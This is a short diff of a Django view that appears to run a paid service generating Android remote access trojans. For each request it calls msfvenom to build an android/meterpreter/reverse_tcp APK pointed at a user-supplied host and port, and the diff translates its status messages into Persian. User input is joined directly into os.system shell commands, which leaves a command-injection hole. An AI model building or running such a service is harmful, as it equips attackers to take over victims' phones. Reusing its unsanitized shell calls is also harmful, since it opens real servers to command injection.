@@ -29,9 +29,9 @@ def add(request):
         d=os.system('mkdir /root/django/users/'+ str(username))
         c=os.system('cd '+str(dircd)+' ;msfvenom -p android/meterpreter/reverse_tcp lhost='+str(host)+' lport='+str(port)+' -o '+ str(dir)+'.apk')
         if c == 0:
-            c = "Your rat created in "+ str(dir)+".apk"
+            c = "رت شما در این آدرس ایجاد شد "+ str(dir)+".apk"
     else:
-        c = 'you dont have credit'
+        c = 'شما برای ساخت رت به اندازه کافی اعتبار ندارید'
     # Render the HTML template index.html with the data in the context variable
     return render(
         request,
